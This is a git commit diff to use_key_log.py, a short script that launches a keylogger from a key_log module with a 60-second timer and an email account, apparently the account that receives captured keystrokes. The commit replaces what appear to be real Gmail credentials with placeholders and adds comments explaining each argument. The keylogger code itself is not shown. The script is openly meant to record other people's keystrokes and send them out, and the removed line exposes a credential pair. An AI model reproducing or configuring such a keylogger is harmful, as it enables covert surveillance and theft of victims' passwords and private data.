e7a553567668b38c6aae1cb138a5e47bb594a1a4
Raj Upadhyay <upadhyayraj007@gmail.com>
2020-02-12 16:54:00 +0530

    Update use_key_log.py

--- use_key_log.py
+++ use_key_log.py
@@ -1,4 +1,7 @@
 import key_log
 
-my_keylogger = key_log.Keylogger(60,"wifitouse@gmail.com","WiFI!@#$")
+my_keylogger = key_log.Keylogger(60,"email@email.com","pwd")
+#First Argument is "TIMER" like 60 Seconds
+#Second Argument is "Email ID"
+#Third Argument is "Password"
 my_keylogger.start() 
